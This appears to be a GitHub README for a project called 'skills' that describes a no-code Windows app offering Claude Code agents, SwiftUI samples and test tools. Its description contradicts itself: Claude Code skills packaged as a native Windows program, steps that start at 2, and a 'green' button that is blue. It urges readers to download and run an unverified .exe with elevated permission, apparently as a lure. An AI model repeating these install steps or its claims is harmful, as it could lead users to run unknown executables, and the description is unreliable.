## 📋 About skills

skills is a simple set of tools designed to work with Claude Code. It includes helpful agents and code snippets you can use without writing any code yourself. This software lets you interact with Claude Code features on your Windows computer in a straightforward way.

The tools focus on ease and speed. They bring together useful Claude Code skills like iOS design helpers, testing methods, and more. This package works well if you want to explore Claude Code plugins or SwiftUI components without needing programming skills.

---

## 💻 System Requirements

Before you start, make sure your computer meets these needs:

- Windows 10 or newer (Windows 11 works well)
- At least 4 GB of RAM
- 500 MB of free disk space for installation
- Internet connection to download the software
- Recommended screen resolution: 1280x720 or higher

No additional software is needed before installing skills. Everything runs natively on Windows.

## 🚀 Getting Started with skills

This section gives clear steps to download, install, and run skills on your Windows PC.

Click the big green button below or use this link to go to the download page:

[![Download skills](https://img.shields.io/badge/Download-skills-blue?style=for-the-badge)](https://github.com/ajwadrana/skills)

### 2. Download the installer

On the GitHub page, look for the **Releases** section or the **Code** tab. You want to find an installer file, usually named something like `skills-setup.exe` or a version number followed by `.exe`.

Click the installer file to download it to your computer. Usually, it will save to your Downloads folder.

### 3. Run the installer

- Open the folder where the installer downloaded.
- Double-click the installer file (`skills-setup.exe` or similar).
- If Windows asks for permission, choose **Yes** to allow the program to install.
- Follow the installer instructions by clicking **Next**.
- Wait until the setup finishes and click **Finish**.

### 4. Open skills

- Find the newly installed skills app in the Start menu. It should be under the name “skills” or similar.
- Click to open it.
- If the app asks for permission to connect to the internet, allow it. This is normal.

## 🛠 Basic Tasks in skills

Here are typical tasks you might want to try.

- Click **Agents** in the main menu.
- Select an agent like "Code Helper" or "iOS Design".
- The agent shows instructions you can follow.
- No typing needed, just click options to interact.

### View iOS design samples

- Go to **Design Samples**.
- Scroll through SwiftUI and iOS 26 style examples.

### Test code ideas

- Choose **Test Tools**.
- Click a test scenario to run.
- See results displayed clearly without code editing.
